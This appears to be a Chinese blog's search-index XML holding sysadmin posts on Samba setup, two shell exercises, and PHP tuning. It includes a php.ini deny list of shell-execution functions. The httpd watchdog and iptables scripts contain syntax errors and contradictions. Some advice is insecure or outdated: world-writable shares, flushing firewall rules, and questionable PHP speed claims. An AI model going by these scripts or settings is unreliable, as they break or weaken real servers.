map参数详解，比如有一个系统用户名为zyhyt.org，同时我们也设定其为samba的登录名，虽然是两套独立的密码，但依然告诉了用户，我系统内 也存在zyhyt.org这个用户。严格的说这也是违背系统安全规则的，不法人士可能会利用该用户名暴力猜解获得系统内帐户权限。samba提供的用户名 映射功能，只需编辑smbuser文&gt;件，格式为：真实的用户名 = 映射出的用户名（随便自定义）；zyhyt.org = nas_guest nas_nobody（可以映射出多个用户名，注意中间的空格）。设定完成后，我们只需将nas_guest告诉用户即可，无须担心真实的 zyhyt.org用户名暴露。]]></content>
      <tags>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[samba中文乱码的问题]]></title>
    <url>%2F2017%2F08%2F10%2FSamba%2F5.%20samba%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[samba中文乱码的问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用SSH登陆远程的linux服务器，用win浏览运行samba的linux服务器中有中文名的文件夹的时候，看到里面的中文文件名都是乱码，而且想用shell来设置一下权限也设置不了。 打开/etc/sysconfig/i18n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置为： 12345LANG="zh_CN.GB2312"LANGUAGE="zh_CN.GB18030:zh_CN.GB2312:zh_CN"SUPPORTED="zh_CN.GB18030:zh_CN.GB2312:zh_CN.UTF-8:zh:en_US.UTF-8:en_US:en:ja_JP.UTF-8:ja_JP:ja"SYSFONT="lat0-sun16"SYSFONTACM="8859-15" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中LANG=”zh_CN.GB2312” 是必须的(如果不想让中文乱码的话!!!) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其它的可以按照自已的需求来改变。 打开smb.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加： 123display charset=cp936 unix charset=cp936 dos charset=cp936 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新启动系统即可。]]></content>
      <tags>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习16]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A016%2F</url>
    <content type="text"><![CDATA[在服务器上，写一个监控脚本，每隔10s去检测一次服务器上的httpd进程数，如果大于等于500的时候，就需要自动重启一下apache服务，并检测启动是否成功？若没有正常启动还需再一次启动，最大不成功数超过5次则需要理解发邮件通知管理员，并且以后不需要再检测！ 如果启动成功后，1分钟后再次检测httpd进程数，若正常则重复之前操作（每隔10s检测一次），若还是大于等于500，那放弃重启并需要发邮件给管理员，然后自动退出该脚本。 1234567891011121314151617181920212223242526successsum=0;while ：; do httpdnum=`ps aux | grep "httpd"|grep -v "grep"|wc -l ` restartnum=0; if [ httpdnum - lt 5000 ];then if[ $successsum- eq 1 ];then echo "宕机了"|mail -s "完了" 123#123.com exit fi while [ restartnum -le 5 ];do /usr/local/apache2/bin/apachectl restart restartnum=$[$restartnum+1] ps aux |grep "httpd "| grep -v "grep" &gt;&gt; 1.txt if grep -q 'httpd' 1.txt ;then successnum=$[$successnum+1] break fi done if [ restartnum -eq 6 ];then echo "重启次数超过了五次"|mail -s "不行啦！" 123@123.com exit else sleep 60 fi fidone 这段代码中 successsum=0 代表成功启动的次数，restartnum 代表的启动次数。看起来很复杂，只要理清思路就没什么问题了]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[samba同时用匿名和用户登录]]></title>
    <url>%2F2017%2F08%2F10%2FSamba%2F4.%20samba%E5%90%8C%E6%97%B6%E7%94%A8%E5%8C%BF%E5%90%8D%E5%92%8C%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[samba同时用匿名和用户登录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;关于同时使用匿名和用户登录，配置文件如下，已经验证成功： 1234567891011121314151617181920212223242526272829303132333435[global] workgroup = WORKGROUP server string = Samba Server Version %v log file = /var/log/samba/log.%m max log size = 50 security = user passdb backend = tdbsam load printers = yes cups iptions = raw map to guest = bad user guest account = nobody encrypt password = yes smb passwd file = /etc/samba/smbpasswd[public] comment = public path = /data/pub/public browseable = yes guest ok = yes writable = yes printable = no create mask = 0644 directory mask = 0755[project] comment = project path = /data/pub/project browseable = yes public = no guest ok = no writeable = yes force user = root printable = no create mask = 0644 directory mask = 0755 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：需要手动创建 /data/pub/public 和 /data/pub/project 目录，为了顺利完成试验，需要提前先改成 777 权限。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还需创建用户： 12[root@192 ~]# useradd testuser[root@192 ~]# pdbedit -a testuser]]></content>
      <tags>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 练习17]]></title>
    <url>%2F2017%2F08%2F10%2FShell%20%E7%BB%83%E4%B9%A0%2Fshell%20%E7%BB%83%E4%B9%A017%2F</url>
    <content type="text"><![CDATA[需求： 根据web服务器上的访问日志，把一些请求量非常高的ip给拒绝掉！ 分析： 我们要做的，不仅是要找到哪些ip请求量不合法，并且还要每隔一段时间把之前封掉的ip（若不再继续请求了）给解封。 所以该脚本的关键点在于定一个合适的时间段和阀值。 比如， 我们可以每一分钟去查看一下日志，把上一分钟的日志给过滤出来分析，并且只要请求的ip数量超过50次那么就直接封掉。 而解封的时间又规定为每半小时分析一次，把几乎没有请求量的ip给解封！ 12345678910111213141516171819202122232425262728293031#!/bin/bashlogfile=/home/logs/client/access.logd1=`date -d "-1 minute" +%H:%M`d2=`date +%M`ipt=/sbin/iptablesips=/tmp/ips.txtblock()&#123; grep "$d1:" $logfile|awk '&#123;print $1&#125;'|sort -n|uniq -c|sort -n &gt; $ips for ip in `awk '$1&gt;50 &#123;print $2&#125;' $ips` do $ipt -l INPUT -p tcp --dport 80 -s $ip -j REJECT echo "`date +%F-%T` $ip" &gt;&gt; /tmp/badip.txt done&#125;unblock()&#123; for i in `$ipt -nvL --line-numbers |grep '0.0.0.0/0'|awk '$2&lt;15 &#123;print $1&#125;'|sort -nr` do $ipt -D INPUT $i done $ipt -Z&#125;if [ $d2 == "00" ]||[ $d2 == "30" ]then unblock blockelse blockfi]]></content>
      <tags>
        <tag>shell练习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[samba部署和优化]]></title>
    <url>%2F2017%2F08%2F10%2FSamba%2F1.%20samba%E9%83%A8%E7%BD%B2%E5%92%8C%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[samba部署和优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;samba 服务可以实现 windows 和 linux 的文件共享，配置不难，使用也非常简单。 1.samba 配置文件 smb.conf&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装系统的时候大多会默认安装 samba ，如果没有安装，在 centos 上只需要运行 1[root@192 ~]# yum install -y samba samba-client &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;samba 配置文件为 /etc/samba/smb.conf ，通过修改这个配置文件来完成各种需求。打开配置文件，发现很多内容都用 # 或者 ； 注释掉了，先看一下未被注释的部分 123456789101112131415161718[global] workgroup = MYGROUP server string = Samba Server Version %v security = user passdb backend = tdbsam load printers = yes cups options = raw[homes] comment = Home Directories browseable = no writable = yes[printers] comment = All Printers path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要有以上三个部分：[global] , [homes] , [printers] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[global] 定义全局的配置， workgroup 用来定义工作组，相信如果安装过 windows 系统，都会对这个 workgroup 不陌生。一般情况下，需要把这里的 MYGROUP 改成 WORKGROUP （windows 默认的工作组名字）。 security = user ：这里指定 samba 的安全等级。关于安全等级有四种： share ：用户不需要帐号密码即可登录 samba 服务器 user ：由提供服务的 samba 服务器负责检查账户及密码（默认） server ：检查账户及密码的工作由另一台 windows 或 samba 服务器负责 domain ：指定 windows 域控制服务器来验证用户的账户及密码 passdb bankend = tdbsam ：passdb backend （用户后台），samba有三种用户后台：smbpasswd，tdbsam 和 ldapsam。 smbpasswd ：该方式是使用 smb 工具 smbpasswd 给系统用户（真实用户或者虚拟用户）设置一个 samba 密码，客户端就用此密码访问 samba 资源。smbpasswd 在 /etc/samba 中，有时需要手工创建该文件。 tdbsam：使用数据库文件创建用户数据库。数据库文件叫 passdb.tdb，在 /etc/samba 中。passdb.tdb 用户数据库可使用 smbpasswd -a 创建 samba 用户，要创建的 samba 用户必须先是系统用户。也可以使用 pdbedit 创建 samba 账户。pdbedit 参数很多，其中主要的有： pdbedt -a username ：新建 samba 账户 pdbedit -x username ：删除 samba 账户 pdbedit -L ：列出 samba 用户列表，读取 passdb.tdb 数据库文件 pdbedit -Lv ：列出 samba 用户列表详细信息 pdbedit -c “[D]” -u username ：暂停该 samba 用户帐号 pdbeidt -c “[]” -u username ：恢复该 samba 用户帐号 ldapsam ：基于 LDAP 账户管理方式验证用户。首先要建立 LDAP 服务，设置 “passdb backend = ldapsam：ldap://LDAP Server” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;load printers 和 cups options 两个参数用来设置打印机相关 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了这些参数外，还有几个参数需要了解： netbios name = MYSERVER ：设置出现在网上邻居中的主机名 hosts allow = 127.192.168.12.192.168.13 ：用来设置允许的主机，如果在前面加 “；” 则表示允许所有主机。 log file = /var/log/samba/%m.log ：定义 samba 的日志，这里的 %m 是上面的 netbios name max log size = 50 ：指定日志的最大容量，单位是K &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[home] 该部分内容共享用户子机的家目录，也就是说，当用户登录到 samba 服务器上时，实际上是进入到了该用户的家目录，用户登录后，共享名不是 homes 而是用户子机的标识符，对于单纯的文件共享的环境来说这部分可以注释掉。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[printers] 该部分内容设置打印机共享 2.samba实践&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;samba 可以实现 linux 和 windows 机器相互共享文件，非常实用。下面实践几个应用。 A.samba 实践一&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要求：共享一个目录，任何人都可以访问，即不用输入密码即可访问，要求制度 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开 samba 配置文件 /etc/samba/smb.conf 1[root@192 ~]# vim /etc/samba/smb.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 [global] 部分把：MYGROUP 改成 WORKGROUP ，把 security = user 修改为 security = share 。然后在文件的最末尾处加入以下内容： 123456[share]comment = share allpath = /tmp/sambabrowseable = yespublic = yeswritable = no &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建测试目录： 1234[root@192 ~]# mkdir /tmp/samba[root@192 ~]# chmod 777 /tmp/samba[root@192 ~]# touch /tmp/samba/sharefiles[root@192 ~]# echo "111111" &gt; /tmp/samba/sharefiles &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动 samba 服务： 1[root@192 ~]# /etc/init.d/smb start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试能否试验要求，首先测试配置的 smb.conf 是否正确，使用命令： 1[root@192 ~]# testparm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;会看到一个警告：WARNING: The security=share option is deprecated ，不过影响不大，无需管它。如果没有错就在 windows 机器上的浏览器中输入：file://192.168.0.73/sharefiles 看能否访问到 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 linux 机器上输入： 1[root@192 ~]# smbclient //192.168.0.73/share &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有个方法就是挂载，在挂载前先安装 1[root@192 ~]# yum install -y cifs-utils &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;挂载 1[root@192 ~]# mount -t cifs //192.168.0.73/share /opt/ B.samba 实践二&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要求：共享一个目录，使用用户名和密码登录后才可以访问，要求可以读写： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开 samba 的配置文件 /etc/samba/smb.conf 1[root@192 ~]# vim /etc/samba/smb.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[global] 部分内容如下： 1234567[global] workgroup = WORKGROUP server string = Samba Server Version %v security = user passdb backend = tdbsam load printers = yes cups options = raw &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还需要加入一下内容： 123456[myshare] comment = share for users path = /samba browseable = yes writable = yes public = no &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件，创建目录： 12[root@192 ~]# mkdir /samba[root@192 ~]# chmod 777 /samba &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后添加用户。因为在 [global] 中 “passdb backend = tdbsam”，所以要使用 pdbedit 来增加用户，注意添加的用户必须在系统中存在，所以需要先创建系统帐号： 12[root@192 ~]# useradd user1[root@192 ~]# useradd user2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后添加 user1 为 samba 帐号： 1[root@192 ~]# pdbedit -a user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在添加 user2 为 samba 帐号： 1[root@192 ~]# pdbedit -a user2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出 samba 的所有帐号： 123[root@192 ~]# pdbedit -Luser1:503:user2:504: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 samba 服务 1[root@192 ~]# service smb restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开浏览器输入 file://192.168.0.73/myshare 弹出窗口后输入帐号和密码登录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux 机器登录 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体语法为：smbclient //IP/共享名 -U 用户名 1[root@192 ~]# smbclient //192.168.0.73/myshare -U user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以用 “？” 列出所有可以使用的命令。常用的有 cd，ls，rm，pwd，tar ，mkdir，chown，get，put等，使用 help+ 命令 可以打印该命令如何使用，其中 get 是下载，put 是上传。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外还可以通过挂载方式 1[root@192 ~]# mount -t cifs //192.168.0.73/myshare /mnt -o username=user2,password=123456 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要指定 -t cifs //IP/共享名 本地挂载点 -o后面跟 username 和 password 挂载完后就可以像使用本地的目录一样使用共享目录了，注意共享名后面不能有斜杠。]]></content>
      <tags>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP测试 php 解析]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F6.%20LAMP%E6%B5%8B%E8%AF%95%20php%20%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[测试 php 解析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试是否正确解析 php ： 1vim /usr/local/apache2/htdocs/1.php &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入： 123&lt;?php echo "php解析正常";?&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，继续测试： 1curl localhost/1.php 看是否能看到如下信息： 12[root@localhost ~]# curl localhost/1.phpphp解析正常 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php 解析正常 只有显示这个信息，才算正常解析。否则就是没有成功解析。当然，也可以用真机上的浏览器通过 ip 访问，比如虚拟机 ip 为 192.168.1.101，那么在浏览器上输入 http://192.168.0.101/1.php 看是否只显示一行 php解析正常 如果访问不太顺畅，请检测 iptables 规则。 1[root@localhost ~]# iptables -nvL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有一些规则，请执行： 12[root@localhost ~]# iptables -F[root@localhost ~]# service iptables save]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些PHP性能的优化]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F5.%20%E4%B8%80%E4%BA%9BPHP%E6%80%A7%E8%83%BD%E7%9A%84%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[一些PHP性能的优化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP优化对于PHP的优化主要是对php.ini中的相关主要参数进行合理调整和设置，以下我们就来看看php.ini中的一些对性能影响较大的参数应该如何设置。 1vim /etc/php.ini PHP函数禁用找到：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;disable_functions = 该选项可以设置哪些PHP函数是禁止使用的，PHP中有一些函数的风险性还是相当大的，可以直接执行一些系统级脚本命令，如果允许这些函数执行，当PHP程序出现漏洞时，损失是非常严重的！以下我们给出推荐的禁用函数设置： 1disable_functions = phpinfo,passthru,exec,system,popen,chroot,escapeshellcmd,escapeshellarg,shell_exec,proc_open,proc_get_status &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需注意：如果您的服务器中含有一些系统状态检测的PHP程序，则不要禁用shell_exec,proc_open,proc_get_status等函数。 PHP脚本执行时间找到：1max_execution_time = 30 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项设定PHP程序的最大执行时间，如果一个PHP脚本被请求，且该PHP脚本在max_execution_time时间内没能执行完毕，则PHP不再继续执行，直接给客户端返回超时错误。没有特殊需要该选项可保持默认设置30秒，如果您的PHP脚本确实需要长执行时间则可以适当增大该时间设置。 PHP脚本处理内存占用找到：1memory_limit = 8M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项指定PHP脚本处理所能占用的最大内存，默认为8MB，如果您的服务器内存为1GB以上，则该选项可以设置为12MB以获得更快的PHP脚本处理效率。 PHP全局函数声明找到：1register_globals = Off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网络上很多关于PHP设置的文章都推荐将该选项设置为On，其实这是一种及其危险的设置方法，很可能引起严重的安全性问题。如果没有特殊的需要，强烈推荐保留默认设置！ PHP上传文件大小限制找到：1upload_max_filesize = 2M &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该选项设定PHP所能允许最大上传文件大小，默认为2MB。根据实际应用需求，可以适当增大该设置。 Session存储介质找到：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869session.save_path``` &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;如果你的PHP程序使用Session对话，则可以将Session存储位置设置为/dev/shm，/dev/shm是Linux系统独有的TMPFS文件系统，是以内存为主要存储方式的文件系统，比RAMDISK更优秀，因为可以使用DISKSWAP作为补充，而且是系统自带的功能模块，不需要另行配置。想想看，从磁盘IO操作到内存操作，速度会快多少？只是需要注意，存储在/dev/shm的数据，在服务器重启后会全部丢失。不过这对于Session来说是无足轻重的。 &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;由于水平有限，有些还是不太明白为什么。如果有更好建议的欢迎随时补充！1. 用单引号代替双引号来包含字符串，这样做会更快一些。因为PHP会在双引号包围的字符串中搜寻变量，单引号则不会，注意：只有echo能这么做，它是一种可以把多个字符串当作参数的“函数”(译注：PHP手册中说echo是语言结构，不是真正的函数，故把函数加上了双引号)。 **PS：在单引号中，PHP不会自动搜寻变量、转义字符等，因此效率上快很多。而一般来说字符串是没有变量的，所以使用双引号会导致性能不佳。**2. 如果能将类的方法定义成static，就尽量定义成static，它的速度会提升将近4倍。 **PS：事实上，function、method、static method的速度不会有太大差异。具体可见“PHP函数的实现原理及性能分析【转载】”一文。**3. $row[’id’] 的速度是$row[id]的7倍。 **PS：不太懂，貌似差异只有后者会先判断id这个宏是否存在，如果不存在则自动转变为字符串。**4. echo 比 print 快，并且使用echo的多重参数(译注：指用逗号而不是句点)代替字符串连接，比如echo $str1,$str2。**PS：如果使用echo $str1.$str2 就会需要 PHP 引擎首先把所有的变量连接起来，然后在输出，而echo $str1,$str2，PHP 引擎就会按照循序输出他们**5. 在执行for循环之前确定最大循环数，不要每循环一次都计算最大值，最好运用foreach代替。 **PS：像count、strlen这样的操作其实是O(1)的，因此不会带来太多消耗，当然避免每次循环都计算是比较好的策略。最好用foreach代替for，这个效率更高，如果考虑到foreach($array as $var)每次拷贝的消耗，可以使用foreach($array as &amp;$var)这样的引用。**6. 注销那些不用的变量尤其是大数组，以便释放内存。 **PS：如果没有记错的话，unset($array)不会立刻释放内存，但随时释放是个好习惯。**7. 尽量避免使用__get，__set，__autoload。8. require_once()代价昂贵。 **PS：require_once和include_once需要判重，因此效率上要低，但是5.2版本后效率问题已经基本解决。**9. include文件时尽量使用绝对路径，因为它避免了PHP去include_path里查找文件的速度，解析操作系统路径所需的时间会更少。**PS：支持，尽量少用iniset()来设置include_path.**10. 如果你想知道脚本开始执行(译注：即服务器端收到客户端请求)的时刻，使用$_SERVER['REQUEST_TIME']要好于time()。 **PS：$_SERVER['REQUEST_TIME']保存了发起该请求时刻的时间戳，而time()则返回当前时刻的Unix时间戳。**11. 函数代替正则表达式完成相同功能。 **PS：这种函数是指strtok、strstr、strpos、str_replace、substr、explode、implode等等。**12. tr_replace函数比preg_replace函数快，但strtr函数的效率是str_replace函数的四倍。 **PS：字符串操作比正则替换要快。**13. 如果一个字符串替换函数，可接受数组或字符作为参数，并且参数长度不太长，那么可以考虑额外写一段替换代码，使得每次传递参数是一个字符，而不是只写一行代码接受数组作为查询和替换的参数。 **PS：需要考虑到内置函数和用户自定义函数的开销差异，恐怕这种做法得不偿失。**14. 使用选择分支语句(译注：即switch case)好于使用多个if，else if语句。 **PS：php中switch支持数值和字符串变量，比C的switch要好用，建议使用。**15. 用@屏蔽错误消息的做法非常低效，极其低效。 **PS：有什么替代方法吗？没有的话还是不得不用的……**16. 打开apache的mod_deflate模块，可以提高网页的浏览速度。17. 数据库连接当使用完毕时应关掉，不要用长连接。 **PS：在连接之前，最好设置一下相应的超时机制，例如链接超时、读写超时、等待超时等。**18. 错误消息代价昂贵。19. 在方法中递增局部变量，速度是最快的。几乎与在函数中调用局部变量的速度相当。20. 递增一个全局变量要比递增一个局部变量慢2倍。21. 递增一个对象属性(如：$this-&gt;prop++)要比递增一个局部变量慢3倍。22. 递增一个未预定义的局部变量要比递增一个预定义的局部变量慢9至10倍。23. 仅定义一个局部变量而没在函数中调用它，同样会减慢速度(其程度相当于递增一个局部变量)。PHP大概会检查看是否存在全局变量。24. 方法调用看来与类中定义的方法的数量无关，因为我(在测试方法之前和之后都)添加了10个方法，但性能上没有变化。25. 派生类中的方法运行起来要快于在基类中定义的同样的方法。26. 调用带有一个参数的空函数，其花费的时间相当于执行7至8次的局部变量递增操作。类似的方法调用所花费的时间接近于15次的局部变量递增操作。27. Apache解析一个PHP脚本的时间要比解析一个静态HTML页面慢2至10倍。尽量多用静态HTML页面，少用脚本。28. 除非脚本可以缓存，否则每次调用时都会重新编译一次。引入一套PHP缓存机制通常可以提升25%至100%的性能，以免除编译开销。29. 尽量做缓存，可使用memcached。memcached是一款高性能的内存对象缓存系统，可用来加速动态Web应用程序，减轻数据库负载。对运算码 (OP code)的缓存很有用，使得脚本不必为每个请求做重新编译。30. 当操作字符串并需要检验其长度是否满足某种要求时，你想当然地会使用strlen()函数。此函数执行起来相当快，因为它不做任何计算，只返回在zval 结构(C的内置数据结构，用于存储PHP变量)中存储的已知字符串长度。但是，由于strlen()是函数，多多少少会有些慢，因为函数调用会经过诸多步骤，如字母小写化(译注：指函数名小写化，PHP不区分函数名大小写)、哈希查找，会跟随被调用的函数一起执行。在某些情况下，你可以使用isset() 技巧加速执行你的代码。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;举例如下```bashif (strlen($foo) &lt; 5) &#123; echo “Foo is too short”$$ &#125;#与下面的技巧做比较if (!isset($foo&#123;5&#125;)) &#123; echo “Foo is too short”$$ &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;调用isset()恰巧比strlen()快，因为与后者不同的是，isset()作为一种语言结构，意味着它的执行不需要函数查找和字母小写化。也就是说，实际上在检验字符串长度的顶层代码中你没有花太多开销。 PS：长见识了。 当执行变量$i的递增或递减时，$i++会比++$i慢一些。这种差异是PHP特有的，并不适用于其他语言，所以请不要修改你的C或Java代码并指望它们能立即变快，没用的。++$i更快是因为它只需要3条指令(opcodes)，$i++则需要4条指令。后置递增实际上会产生一个临时变量，这个临时变量随后被递增。而前置递增直接在原值上递增。这是最优化处理的一种，正如Zend的PHP优化器所作的那样。牢记这个优化处理不失为一个好主意，因为并不是所有的指令优化器都会做同样的优化处理，并且存在大量没有装配指令优化器的互联网服务提供商(ISPs)和服务器。 并不是事必面向对象(OOP)，面向对象往往开销很大，每个方法和对象调用都会消耗很多内存。 并非要用类实现所有的数据结构，数组也很有用。 不要把方法细分得过多，仔细想想你真正打算重用的是哪些代码? 当你需要时，你总能把代码分解成方法。 PS：分解成方法要适当，行数少使用频率高的方法尽量用直接写代码，可以减少函数堆栈开销；且方法嵌套不宜过深，否则大大影响PHP的运行效率。 尽量采用大量的PHP内置函数。 如果在代码中存在大量耗时的函数，你可以考虑用C扩展的方式实现它们。 评估检验(profile)你的代码。检验器会告诉你，代码的哪些部分消耗了多少时间。Xdebug调试器包含了检验程序，评估检验总体上可以显示出代码的瓶颈。 mod_zip可作为Apache模块，用来即时压缩你的数据，并可让数据传输量降低80%。 在可以用file_get_contents替代file、fopen、feof、fgets等系列方法的情况下，尽量用file_get_contents，因为他的效率高得多!但是要注意file_get_contents在打开一个URL文件时候的PHP版本问题; PS：这个要记住，尽量使用file_get_contents和file_put_contents，不需要自己判断文件句柄打开是否成功。 尽量的少进行文件操作，虽然PHP的文件操作效率也不低的; 优化Select SQL语句，在可能的情况下尽量少的进行Insert、Update操作(在update上，我被恶批过); 尽可能的使用PHP内部函数(但是我却为了找个PHP里面不存在的函数，浪费了本可以写出一个自定义函数的时间，经验问题啊!); PS：内置函数比用户自定义函数效率高了将近一个数量级。 循环内部不要声明变量，尤其是大变量：对象(这好像不只是PHP里面要注意的问题吧?); PS：这个必须的，变量过多或者过大时，每次重分配的开销就无法忽略。 多维数组尽量不要循环嵌套赋值; 在可以用PHP内部字符串操作函数的情况下，不要用正则表达式; foreach效率更高，尽量用foreach代替while和for循环; 用单引号替代双引号引用字符串; PS：晕，这个不就是第一条吗？ “用i+=1代替i=i+1。符合c/c++的习惯，效率还高”; 对global变量，应该用完就unset()掉;]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[下载小知识]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F4.%20%E4%B8%8B%E8%BD%BD%E5%B0%8F%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[下载小知识&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在官网下载的源码包都提供一个md5校验值，比如 12PHP 5.3.27 (tar.bz2) [11,165Kb] - 11 Jul 2013 md5: 25ae23a5b9615fe8d33de5b63e1bb788 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个校验值，是为了让下载者校验一下，我们下载的源码包是否改动过。如何校验呢？ 假如我们已经下载好了这个 php-5.3.27.tar.bz2 获取它的md5值得方法为： 12md5sum php-5.3.27.tar.bz225ae23a5b9615fe8d33de5b63e1bb788 php-5.3.27.tar.bz2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有这样才是正确的，否则就有问题了。]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[通过http上传大文件超时的问题]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F3.%20%E9%80%9A%E8%BF%87http%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%96%87%E4%BB%B6%E8%B6%85%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[通过http上传大文件超时的问题&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;架构是 LAMP ， 上传文件的操作，并没有连接mysql，但是却使用了php资源，所以修改设置，不仅要设置apache还要设置php.ini apache httpd.conf 的设置 Timeout 600 这个可以设置成 3600, 单位是s php.ini 相关的参数 file_uploads = on ; 默认为开 upload_max_filesize = 1024M ; 上传最大值 post_max_size = 1024M ; 通过表单POST给PHP的所能接收的最大值 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果还不行，那就修改以下几个参数吧。 max_execution_time = 0 ; 每个php脚本的最大执行时间，单位是秒。0表示不限制 max_input_time = 600000 ; 传送请求数据的最大时间，秒。改的大大的… memory_limit = 500M ; 一个脚本占用内存的上限。这个不建议太大。万一有攻击，你的机器就崩溃了。建议最高256M。]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LNMP- php编译安装]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F13.%20LNMP-%20php%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%2F</url>
